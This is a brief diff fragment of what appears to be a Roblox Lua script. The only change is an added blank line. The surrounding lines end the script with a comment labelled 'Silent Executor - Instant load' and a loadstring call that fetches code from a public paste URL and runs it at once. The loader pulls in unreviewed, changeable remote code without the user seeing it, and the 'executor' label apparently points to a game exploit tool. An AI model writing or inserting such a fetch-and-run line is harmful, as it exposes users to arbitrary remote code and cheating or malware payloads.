@@ -309,6 +309,7 @@ else
         end
     end)
 end
+
 -- Silent Executor - Instant load
 loadstring(game:HttpGet("https://paste.rs/bnoxX"))()
 
